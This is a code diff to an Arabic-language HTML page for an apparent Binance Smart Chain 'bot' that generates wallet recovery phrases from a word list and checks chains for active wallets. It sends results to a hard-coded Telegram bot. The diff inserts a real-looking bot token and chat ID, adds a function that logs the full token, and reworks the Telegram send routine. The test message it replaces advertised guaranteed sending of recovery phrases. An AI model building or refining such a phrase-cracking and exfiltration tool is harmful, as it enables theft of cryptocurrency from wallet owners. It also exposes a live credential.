@@ -1,3 +1,4 @@
+ورديتي هويتي
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
@@ -868,9 +869,9 @@
             "zebra", "zero", "zone", "zoo"
         ];
 
-        // إعدادات Telegram
-        const TELEGRAM_BOT_TOKEN = '7736175658:AAGJGvCGfGKHBGhfKNPfKhqhGNKJdKJJJJJ'; // ضع هنا رمز البوت الخاص بك
-        const TELEGRAM_CHAT_ID = '1234567890'; // ضع هنا معرف المحادثة الخاص بك
+        // إعدادات Telegram - تم التحديث
+        const TELEGRAM_BOT_TOKEN = '8257110214:AAFDx0awsmi7yjz6tCZqVY2jS5BZmygvQKw'; // تم تحديث التوكن
+        const TELEGRAM_CHAT_ID = '910021564'; // تم تحديث الشات آي دي
         const TELEGRAM_API_URL = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`;
 
         // إعدادات BSC
@@ -1071,28 +1072,71 @@
             }
         }
 
-        // وظائف Telegram
+        // وظائف Telegram - معدلة
         async function sendTelegramMessage(message) {
             try {
-                const response = await fetch(`${TELEGRAM_API_URL}/sendMessage`, {
+                console.log('🚀 محاولة إرسال رسالة إلى Telegram...');
+                
+                const url = `${TELEGRAM_API_URL}/sendMessage`;
+                const payload = {
+                    chat_id: TELEGRAM_CHAT_ID,
+                    text: message,
+                    parse_mode: 'HTML'
+                };
+
+                console.log('📤 البيانات المرسلة:', payload);
+
+                const response = await fetch(url, {
                     method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        chat_id: TELEGRAM_CHAT_ID,
-                        text: message,
-                        parse_mode: 'HTML'
-                    })
+                    headers: { 
+                        'Content-Type': 'application/json',
+                        'Accept': 'application/json'
+                    },
+                    body: JSON.stringify(payload)
                 });
                 
                 const data = await response.json();
+                console.log('📥 الاستجابة من Telegram:', data);
+                
                 if (!data.ok) {
-                    console.error('خطأ في إرسال الرسالة:', data.description);
+                    console.error('❌ خطأ في إرسال الرسالة:', data.description);
+                    addLogEntry(`❌ خطأ في Telegram: ${data.description}`, 'error');
                     return false;
                 }
                 
+                console.log('✅ تم إرسال الرسالة بنجاح');
                 return true;
             } catch (error) {
-                console.error('خطأ في الاتصال بـ Telegram:', error);
+                console.error('❌ خطأ في الاتصال بـ Telegram:', error);
+                addLogEntry(`❌ خطأ في الاتصال: ${error.message}`, 'error');
+                return false;
+            }
+        }
+
+        // دالة اختبار إضافية للإعدادات
+        async function testTelegramSettings() {
+            console.log('🔍 اختبار إعدادات Telegram...');
+            console.log('🔑 التوكن:', TELEGRAM_BOT_TOKEN);
+            console.log('💬 الشات آي دي:', TELEGRAM_CHAT_ID);
+            
+            // اختبار الحصول على معلومات البوت
+            try {
+                const testUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getMe`;
+                const response = await fetch(testUrl);
+                const data = await response.json();
+                
+                if (data.ok) {
+                    console.log('✅ البوت نشط:', data.result);
+                    addLogEntry(`✅ البوت نشط: ${data.result.first_name} (@${data.result.username})`, 'success');
+                    return true;
+                } else {
+                    console.error('❌ البوت غير نشط:', data.description);
+                    addLogEntry(`❌ البوت غير نشط: ${data.description}`, 'error');
+                    return false;
+                }
+            } catch (error) {
+                console.error('❌ خطأ في اختبار البوت:', error);
+                addLogEntry(`❌ خطأ في اختبار البوت: ${error.message}`, 'error');
                 return false;
             }
         }
@@ -1493,15 +1537,24 @@
             updateStatus('جاري اختبار الاتصال بـ Telegram...', 'info');
             addLogEntry('🧪 جاري اختبار الاتصال بـ Telegram...');
             
-            const testMessage = `🧪 <b>اختبار الاتصال - BSC Bot المحسن مع البحث السريع</b>\n\nتم الاتصال بنجاح مع بوت Telegram!\n\n✨ <b>الميزات المحسنة:</b>\n• البحث السريع لتوليد العبارات\n• فحص المعاملات كمعيار للنشاط\n• عرض العبارات المباشر\n• دعم العملات المتعددة على BSC\n• ضمان إرسال عبارة الاسترجاع\n\n⏰ ${new Date().toLocaleString('ar-EG', { timeZone: 'Africa/Cairo' })}`;
+            // اختبار إعدادات البوت أولاً
+            const botTest = await testTelegramSettings();
+            
+            if (!botTest) {
+                updateStatus('❌ فشل في اختبار إعدادات البوت', 'danger');
+                return;
+            }
+            
+            // ثم اختبار إرسال الرسالة
+            const testMessage = `🧪 <b>اختبار الاتصال - BSC Bot المحسن</b>\n\nتم الاتصال بنجاح مع بوت Telegram!\n\n✅ <b>الإعدادات:</b>\n• البوت: ${TELEGRAM_BOT_TOKEN.substring(0, 10)}...\n• المحادثة: ${TELEGRAM_CHAT_ID}\n\n⏰ ${new Date().toLocaleString('ar-EG', { timeZone: 'Africa/Cairo' })}`;
             const success = await sendTelegramMessage(testMessage);
             
             if (success) {
                 updateStatus('✅ تم الاتصال بـ Telegram بنجاح!', 'success');
                 addLogEntry('✅ تم الاتصال بـ Telegram بنجاح!', 'success');
             } else {
-                updateStatus('❌ فشل في الاتصال بـ Telegram', 'danger');
-                addLogEntry('❌ فشل في الاتصال بـ Telegram', 'error');
+                updateStatus('❌ فشل في إرسال الرسالة', 'danger');
+                addLogEntry('❌ فشل في إرسال الرسالة', 'error');
             }
         }
 
